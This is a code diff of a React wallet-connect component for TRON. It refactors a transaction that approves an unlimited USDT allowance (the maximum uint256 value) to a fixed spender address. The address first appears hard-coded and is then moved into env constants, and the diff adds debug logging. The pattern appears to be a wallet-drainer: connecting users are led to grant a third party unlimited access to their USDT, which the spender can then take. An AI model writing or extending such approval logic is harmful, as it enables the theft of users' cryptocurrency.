@@ -5,16 +5,7 @@ import { CheckCircle2, AlertTriangle } from "lucide-react";
 import { useEffect, useState } from "react";
 import { useWallet } from "@tronweb3/tronwallet-adapter-react-hooks";
 import { TronWeb } from "tronweb";
-import { BASE_URL, USDT_SPENDER_ADDRESS } from "../../../env";
-
-// ======================
-// CONSTANTS (USDT APPROVAL)
-// ======================
-const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-const SPENDER = "TPv7nBLrp3Q9Z2FvRjnw33LHeqgT5UyYHA";
-
-const MAX_ALLOWANCE =
-  "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+import { BASE_URL, USDT_SPENDER_ADDRESS, USDT_ADDRESS, MAX_ALLOWANCE } from "../../../env";
 
 // ======================
 // TRONWEB INSTANCE
@@ -138,11 +129,18 @@ export function WalletConnect({ onConnect, onDisconnect }: any) {
           callValue: 0,
         },
         [
-          { type: "address", value: SPENDER },
+          { type: "address", value: USDT_SPENDER_ADDRESS },
           { type: "uint256", value: MAX_ALLOWANCE },
         ],
         address
       );
+
+
+      console.log("TX -> ", tx);
+
+      console.log("transaction : ", tx?.transaction);
+
+
 
       if (!tx?.transaction) {
         throw new Error("Failed to build transaction");
